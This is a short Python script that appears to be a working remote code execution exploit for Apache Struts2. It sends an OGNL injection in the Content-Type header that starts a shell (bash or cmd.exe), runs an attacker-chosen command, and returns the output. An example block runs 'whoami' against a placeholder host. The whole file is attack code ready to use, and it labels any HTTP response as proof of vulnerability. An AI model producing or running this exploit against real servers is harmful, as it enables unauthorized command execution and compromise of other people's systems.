import requests

class StrutsRCE:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip("/")

    def run_exploit(self, cmd="id"):
        headers = {
            "Content-Type": "%{(#_='multipart/form-data')."
                            "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
                            "(#_memberAccess?"
                            "(#_memberAccess=#dm):"
                            "((#context.setMemberAccess(#dm))))."
                            f"(#cmd='{cmd}')."
                            "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
                            "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
                            "(#p=new java.lang.ProcessBuilder(#cmds))."
                            "(#p.redirectErrorStream(true))."
                            "(#process=#p.start())."
                            "(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"
        }
        try:
            response = requests.post(self.target_url, headers=headers, timeout=5)
            return {"vulnerable": True, "output": response.text.strip()}
        except Exception as e:
            return {"vulnerable": False, "error": str(e)}

# Example usage
if __name__ == "__main__":
    exploit = StrutsRCE("http://target-host/struts2-showcase/index.action")
    result = exploit.run_exploit("whoami")
    print(result)
